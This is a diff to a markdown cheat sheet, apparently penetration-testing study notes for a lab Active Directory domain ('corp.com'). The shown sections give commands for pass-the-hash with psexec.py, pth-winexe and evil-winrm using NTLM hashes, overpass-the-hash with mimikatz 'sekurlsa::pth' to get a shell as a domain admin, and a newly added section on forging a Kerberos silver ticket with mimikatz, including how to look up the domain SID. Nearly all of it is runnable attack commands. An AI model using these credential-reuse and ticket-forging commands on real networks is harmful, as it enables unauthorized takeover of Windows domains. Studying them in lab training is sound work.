@@ -195,7 +195,6 @@ psexec.py alice:ThisIsTheUsersPassword01@10.11.1.50 cmd.exe
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 
 (evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e  -i 192.168.177.10)
-
 ```
 
 ## Over Pass The Hash
@@ -203,10 +202,30 @@ Converting NTLM hash to TGT and get another user's shell.
 
 ```mimikatz# sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe ```
 
-<- (I can execute commands on this PowerSHell as Jeff_Admin user)
+<- I can execute commands on this PowerSHell as Jeff_Admin user
 
 ```
 PS C:¥Windows¥system32> net use \\dc01  (<- generate TGT)
 PS C:¥Tools¥active_directory> .¥PsExec.exe \\dc01 cmd.exe
+```
 
+## Pass The Ticket
+Making the silver ticket.
+
+(This may be not able to get the shell, but you can access to some services (SPN) with high privilege.)
+
+```
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+```
+
+[*] how to find SID:
+
+```
+C:¥>whoami /user
+USER INFORMATION
+----------------
+User Name SID
+=========== ============================================== 
+corp¥offsec S-1-5-21-1602875587-2787523311-2599479668-1103
 ```
